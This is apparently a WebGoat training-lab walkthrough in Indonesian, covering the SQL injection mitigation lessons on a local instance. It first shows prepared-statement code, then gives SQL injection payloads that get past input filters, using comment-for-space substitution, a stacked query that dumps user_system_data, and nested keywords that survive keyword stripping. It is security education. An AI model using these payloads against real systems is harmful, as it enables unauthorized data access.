# SQL Injection (mitigation)
Ini adalah pertahanan terbaik terhadap SQL injection, yaitu dengan data sebagai satu kesatuan yang terikat pada kolom tanpa interpretasi. 

## Try it! Writing safe code
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/4 masukkan jawaban sebagai berikut
```sh
getConnection
PreparedStatement
prepareStatement
?
?
statement.setString(1, name)
statement.setString(2, mail)
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%202.JPG)

## Try it! Writing safe code
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/5 dan tuliskan source code berikut ini kemudian tekan tombol **Submit**
```sh
try {
    Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
    PreparedStatement statement = conn.prepareStatement("SELECT status FROM users WHERE name=? AND mail=?");
    statement.setString(1, "name");
    statement.setString(2, "mail");
    statement.executeUpdate();
} catch (Exception e) {
    System.out.println("Oops. Something went wrong!");
}
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%204.JPG)

## Input validation alone is not enough!!
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/8
- Ketikkan query injection berikut ini kemudian tekan tombol **Get Account Info**
```sh
a' or '1'='1
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%206.JPG)

- Setelah diinput, muncul keterangan bahwa inputan spasi tidak diperbolehkan. Kita bisa menggantinya dengan tanda komen `/**/` sehingga query injection menjadi sebagai berikut ini. Inputkan query berikut kemudian tekan tombol **Get Account Info**
```sh
a'/**/or/**/'1'='1
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%207.JPG)

- Query injection tersebut ternyata berhasil. Sekarang kita tinggal membuat query injection untuk menampilkan seluruh data di tabel **user_system_data**
```sh
a';/**/select/**/*/**/from/**/user_system_data;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%208.JPG)

## Input validation alone is not enough!!
- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/SqlInjectionMitigations.lesson/9
- Kita bisa mencoba menginputkan query injection di task sebelumnya
```sh
a';/**/select/**/*/**/from/**/user_system_data;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%209.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2010.JPG)

- Terlihat disini bawah semua string yang berhubungan dengan syntak SQL akan dihapus. Jadi kita bisa mengubahnya menjadi seperti berikut ini, dimana ketika string yang berhubungan syntak dihapus, akan tetap terbentuk query injection diatas
```sh
a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20mitigation/sqli%20mitigation%2011.JPG)